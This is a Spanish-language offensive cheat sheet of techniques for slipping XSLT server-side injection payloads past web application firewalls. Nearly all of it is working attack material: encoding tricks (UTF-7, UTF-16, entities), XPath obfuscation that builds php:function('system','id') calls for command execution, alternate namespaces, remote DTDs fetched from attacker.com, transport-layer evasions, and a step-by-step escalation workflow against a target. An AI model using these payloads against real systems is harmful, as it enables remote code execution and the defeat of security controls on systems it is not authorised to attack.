---
aliases:
  - XSLT Bypass
  - XSLT WAF Evasion
  - XSLT Encoding Tricks
tags:
  - type/technique
  - vuln/xslt-injection
  - technique/evasion
  - asset/web-app
kind: SubCheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
  - '[[XML External Entity (XXE)]]'
  - '[[Server-Side Request Forgery (SSRF)]]'
---

# XSLT - Bypasses y Evasión

***

## Encoding del Documento (UTF-16 / UTF-7 / Otros)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf '\xfe\xff' > p.xsl && iconv -f UTF-8 -t UTF-16BE payload.xsl >> p.xsl` | XSL UTF-16 BE con BOM listo para upload | WAF solo escanea UTF-8/ASCII. |
| `printf '\xff\xfe' > p.xsl && iconv -f UTF-8 -t UTF-16LE payload.xsl >> p.xsl` | XSL UTF-16 LE con BOM | Variante little-endian. |
| `iconv -f UTF-8 -t UTF-7 payload.xsl > p.xsl` | XSL UTF-7 — `<` se vuelve `+ADw-` | WAF no entiende UTF-7. |
| `<?xml version="1.0" encoding="UTF-32"?>` + body UTF-32 BE | 4 bytes/char — WAFs casi nunca leen | Edge encoding. |
| `<?xml version="1.0" encoding="ISO-8859-1"?>` + payload latin-1 single-byte | Parser ignora reglas UTF estrictas | WAF asume UTF-8. |
| `<?xml version="1.0" encoding="EBCDIC-US"?>` | Engine crashea / passthrough | Engine fingerprint. |
| `<?xml version="1.0" encoding="windows-1252"?>` | Win-1252 declared | Bypass charset whitelist UTF-8. |
| `curl -X POST -H 'Content-Type: application/xml; charset=utf-16' --data-binary @p.xsl https://target/transform` | Server matchea charset al BOM → parsea UTF-16 | Force charset server-side. |
| `curl -X POST -H 'Content-Type: application/xml; charset=utf-7' --data @p.xsl https://target/transform` | Server fuerza parser UTF-7 | Charset takeover. |
| Omitir `<?xml...?>` y mandar bytes UTF-16 con BOM raw | Parser detecta encoding por BOM, WAF no parsea bytes raw | WAF inspecciona XML decl. |
^xslt-bypass-encoding

### Generar y enviar payload UTF-7

```bash
# Source payload UTF-8
cat > exfil.xsl <<'EOF'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
EOF

# Convertir a UTF-7 (mantiene la declaración XML como ASCII)
iconv -f UTF-8 -t UTF-7 exfil.xsl > exfil-utf7.xsl

# Enviar con charset matching
curl -X POST -H 'Content-Type: application/xml; charset=utf-7' \
  --data-binary @exfil-utf7.xsl https://target.com/transform
```

___

## Character References (Hex / Decimal / Mixed)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `&#x3c;xsl:value-of select=&#x22;system-property('xsl:vendor')&#x22;/&#x3e;` | Tags y quotes via hex entities | WAF regex no decodea entidades. |
| `&#60;xsl:value-of select=&#34;'pwn'&#34;/&#62;` | Decimal entities equivalente | Variante decimal. |
| `<xsl:value-of select="'&#x73;ystem'"/>` | Single char encoded dentro de string literal | Encoding parcial — bypass regex literal. |
| `<xsl:value-of select="concat('&#x73;','ystem')"/>` | Concat con hex char en primer arg | Esconde `s` literal de `system`. |
| `python3 -c "import sys; print(''.join(f'&#x{ord(c):x};' for c in sys.argv[1]))" '<xsl:value-of select="7*7"/>'` | Hex-encode entire payload one-liner | Generación rápida CLI. |
| `python3 -c "import sys; print(''.join(f'&#{ord(c)};' for c in sys.argv[1]))" 'system'` | Decimal-encode string desde CLI | Variante decimal. |
| `<xsl:value-of select="codepoints-to-string((115,121,115,116,101,109))"/>` | XPath 2.0+ build `system` desde codepoints | No literal aparece. Engines: Saxon/Xalan. |
| `<xsl:value-of select="codepoints-to-string(115)"/>` | Single codepoint a char | Char-by-char build. |
| `<xsl:value-of select="for $c in (115,121,115,116,101,109) return codepoints-to-string($c)"/>` | Sequence builder | Bypass char filter más fuerte. |
^xslt-bypass-chars

___

## String Obfuscation con XPath

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `concat('sys','tem')` | Split keyword en literales chicos | WAF blacklist `system`. XSLT 1.0+. |
| `concat('s','y','s','t','e','m')` | Concat char-by-char | Bypass regex secuencia. |
| `substring('xxsystemxx',3,6)` | Extract con padding garbage | Esconde keyword. XSLT 1.0+. |
| `substring-before('systemHERE','HERE')` | Extract antes de marker | Alternativa. |
| `substring-after('XXsystem','XX')` | Extract después de prefix | Otra forma. |
| `translate('zyzdwo','zydwo','syste')` | Substitution cipher char mapping | Char remap evasivo. XSLT 1.0+. |
| `reverse('metsys')` | XPath 2.0+ reverse string | Engines Saxon/Xalan. |
| `string-join(('s','y','s','t','e','m'),'')` | XPath 2.0+ join sequence vacío | Variante de concat. |
| `codepoints-to-string(reverse((109,101,116,115,121,115)))` | Reverse codepoints + build | Doble obfuscation. |
| `unparsed-text(concat('htt','p://attacker.com/cmd'))` | Build URL dinámicamente | Bypass URL blacklist. |
| `<xsl:variable name="c" select="'system'"/><xsl:value-of select="php:function($c,'id')"/>` | Variable indirection | WAF ve `$c` no `system`. |
| `<xsl:value-of select="php:function(string(/root/cmd),'id')"/>` con `<cmd>system</cmd>` en input XML | Cmd desde XML input, no del XSL | Split payload XML+XSL. |
| `<xsl:value-of select="php:function(name(/*[1]),'id')"/>` con root `<system/>` en input | Function name desde XPath name() | Indirección via input. |
^xslt-bypass-xpath

### Chain completa: codepoints + php:function

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:p="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:variable name="cmd" select="codepoints-to-string((115,121,115,116,101,109))"/>
    <xsl:variable name="arg" select="codepoints-to-string((105,100))"/>
    <xsl:value-of select="p:function($cmd,$arg)"/>
  </xsl:template>
</xsl:stylesheet>
```

Resultado: `php:function('system','id')` sin que `system` ni `id` aparezcan literales en el payload.

### Split payload XML + XSL

```xml
<!-- INPUT XML (atacante también lo controla) -->
<root><cmd>system</cmd><a>id</a></root>

<!-- XSL stylesheet -->
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:p="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="p:function(string(/root/cmd),string(/root/a))"/>
  </xsl:template>
</xsl:stylesheet>
```

WAF que solo inspecciona el XSL no ve `system` — está en el XML.

___

## Namespaces y Prefijos Alternativos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<x:stylesheet xmlns:x="http://www.w3.org/1999/XSL/Transform"><x:value-of select="'x'"/></x:stylesheet>` | Prefix `x:` en vez de `xsl:` | WAF regex hardcoded `xsl:`. |
| `<a:stylesheet xmlns:a="http://www.w3.org/1999/XSL/Transform">...</a:stylesheet>` | Prefix `a:` arbitrario | Variación random. |
| `<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"><value-of select="'x'"/></stylesheet>` | Default namespace — sin prefix | WAF busca `:value-of`. |
| `<xsl:value-of xmlns:xsl="http://www.w3.org/1999/XSL/Transform" select="'x'"/>` | xmlns inline en cada elemento | Fragmenta detección. |
| `<p:function xmlns:p="http://php.net/xsl">` con prefix `p:` | Cambiar `php:` por `p:` (mismo URI) | WAF busca `php:function`. |
| `<j:Runtime xmlns:j="java:java.lang.Runtime">` | Prefix `j:` para Java | Variante Saxon/Xalan. |
| `<msxsl:script xmlns:msxsl="urn:schemas-microsoft-com:xslt">` | Prefix MSXML standard | Default MSXML. |
| `<X:Value-Of xmlns:X="http://www.w3.org/1999/XSL/Transform">` | Mayúsculas en prefix | Edge — confunde WAFs case-sensitive. |
| `<x:value-of    select   =   "'pwn'"   />` | Whitespace extra entre attrs | Fragmenta regex strict. |
| `<x:value-of disable-output-escaping="yes" select="'pwn'"/>` | Atributos reordenados | Bypass regex orden estricto. |
| `xmlns:xsl="..." xmlns:y="..."` ambos al mismo URI | Dos prefixes mismo URI | Mezcla en un doc. |
^xslt-bypass-namespaces

### Stylesheet con namespace alterno + concat

```xml
<?xml version="1.0"?>
<x:stylesheet xmlns:x="http://www.w3.org/1999/XSL/Transform"
              xmlns:p="http://php.net/xsl"
              version="1.0">
  <x:template match="/">
    <x:value-of select="p:function(concat('sys','tem'),'id')"/>
  </x:template>
</x:stylesheet>
```

WAF no matchea `xsl:` ni `php:function('system'` por separado.

___

## CDATA y Entity Wrapping

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<![CDATA[<xsl:value-of select="'x'"/>]]>` | Wrap payload en CDATA | WAFs que no descienden a CDATA. |
| `<!DOCTYPE r [<!ENTITY p "<xsl:value-of select='7*7'/>">]><r>&p;</r>` | Entity con payload, expandida en body | DTD-based expansion. |
| `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/p.dtd">%p;]>` | External DTD trae payload | Atacante hostea DTD. |
| `<!DOCTYPE r [<!ENTITY p1 "<xsl:"><!ENTITY p2 "value-of select='x'/>">]><r>&p1;&p2;</r>` | Payload split en múltiples entities | Fragmenta keyword. |
| `<!DOCTYPE r SYSTEM "http://attacker.com/r.dtd"><r/>` con DTD remoto | Payload entera en remote DTD | Off-host payload. |
| `<!DOCTYPE r [<!ENTITY % a "<!ENTITY p '&#60;xsl:value-of select=&#34;7*7&#34;/&#62;'>"> %a; ]><r>&p;</r>` | Parameter entity define entity (con char refs) | Double-encoded DTD. |
^xslt-bypass-cdata

### Hosting remote DTD

```bash
# Servidor del atacante: p.dtd
cat > p.dtd <<'EOF'
<!ENTITY p "<xsl:value-of xmlns:xsl='http://www.w3.org/1999/XSL/Transform' select='system-property(&apos;xsl:vendor&apos;)'/>">
EOF

python3 -m http.server 80

# Atacante envía al target
curl -X POST --data '<!DOCTYPE r SYSTEM "http://attacker.com/p.dtd"><r>&p;</r>' \
  https://target/transform
```

___

## Comentarios y Whitespace

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<!--x--><xsl:value-of select="'x'"/>` | Comment antes del tag | Rompe WAF regex multiline anchored. |
| `<xsl:template match="/"><!--x--><xsl:value-of select="'x'"/></xsl:template>` | Comment dentro de template | Fragmenta secuencia. |
| `<xsl:value-of   select="'x'"/>` (multiple spaces) | Múltiples spaces entre attrs | Bypass regex strict whitespace. |
| `<xsl:value-of\nselect="'x'"/>` (newline separator) | Newline entre atributos | Edge multiline regex. |
| `<xsl:value-of select = "'x'" />` | Spaces alrededor de `=` y antes de `/>` | Variant. |
| `<?xml version="1.0"?><!-- c --> <xsl:stylesheet ...>` | Comentarios entre prologue y root | Mixed top-level nodes. |
| `<xsl:value-of select="'x' (: XPath comment :)"/>` | XPath 2.0+ comment dentro de select | Saxon/Xalan engines. |
| `<xsl:value-of select="concat( 'a' , 'b' )"/>` | Spaces dentro de function call args | Bypass regex literal `concat(`. |
^xslt-bypass-comments

___

## HTTP / Transport Layer Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H 'Content-Type: text/xml' --data-binary @p.xsl https://target/transform` | Type `text/xml` en vez de `application/xml` | WAF rule específica de `application/xml`. |
| `curl -X POST -H 'Content-Type: application/xslt+xml' --data @p.xsl https://target/transform` | Type específico XSLT | Engine acepta, WAF skip. |
| `gzip -9 p.xsl && curl -X POST -H 'Content-Type: application/xml' -H 'Content-Encoding: gzip' --data-binary @p.xsl.gz https://target/transform` | Gzipped body | WAF inspecciona solo plaintext. |
| `curl -X POST -H 'Transfer-Encoding: chunked' --data-binary @p.xsl https://target/transform` | Chunked transfer encoding | WAF no reensambla. |
| `curl -X POST -F 'file=@p.xsl' https://target/upload` | Multipart upload | XML dentro de multipart bypass. |
| `curl -X POST -H 'X-Original-URL: /transform' -H 'X-Forwarded-For: 127.0.0.1' --data @p.xsl https://target/other-endpoint` | Header-based routing override | WAF aplicado en endpoint distinto. |
| `curl --http1.0 -X POST --data-binary @p.xsl https://target/transform` | HTTP/1.0 protocol downgrade | Algunos WAFs solo parsean H2. |
| `curl -X POST -H 'Content-Type: application/xml' --data-binary $'\xef\xbb\xbf<?xml...' https://target/` | UTF-8 BOM prefix | Confunde WAF parser strict. |
| `curl -X POST --data-binary $'<?xml version="1.0"?>\r\n\r\n<xsl:stylesheet...' https://target/` | CRLF doble entre prologue y root | Edge parser behavior. |
^xslt-bypass-transport

___

## Workflow combinado para WAF agresivo

1. **Fingerprint**: payload básico (`<xsl:value-of select="7*7"/>`) → ver respuesta WAF.
2. **Escalada 1** — concat string obfuscation + namespace alterno:
   ```xml
   <x:stylesheet xmlns:x="http://www.w3.org/1999/XSL/Transform" xmlns:p="http://php.net/xsl" version="1.0">
     <x:template match="/"><x:value-of select="p:function(concat('sy','stem'),'id')"/></x:template>
   </x:stylesheet>
   ```
3. **Escalada 2** — si engine es Saxon/Xalan: codepoints-to-string sin literales.
4. **Escalada 3** — UTF-7 encoding completo del documento (`iconv -f UTF-8 -t UTF-7`).
5. **Escalada 4** — UTF-16 BE + BOM + `Content-Type: charset=utf-16`.
6. **Escalada 5** — split payload XML + XSL (input controla los strings).
7. **Último recurso** — remote DTD con todo el payload off-host.

___

## Engines compatibles por técnica

| Técnica | libxslt (XSLT 1.0) | Saxon-HE/PE/EE | Xalan-Java | MSXML |
|:---|:---:|:---:|:---:|:---:|
| `concat()` | ✅ | ✅ | ✅ | ✅ |
| `substring()` / `translate()` | ✅ | ✅ | ✅ | ✅ |
| `codepoints-to-string()` | ❌ | ✅ | ✅ (XSLT 2+) | ❌ |
| `string-join()` / `reverse()` | ❌ | ✅ | ✅ | ❌ |
| `unparsed-text()` | ❌ | ✅ | ✅ | ❌ |
| UTF-7 / UTF-16 input | ✅ | ✅ | ✅ | ✅ |
| External DTD | ✅ (default off ≥1.1.27) | ✅ (URIResolver) | ✅ | ✅ |
| CDATA wrap | ✅ | ✅ | ✅ | ✅ |
| Namespace alterno | ✅ | ✅ | ✅ | ✅ |

***
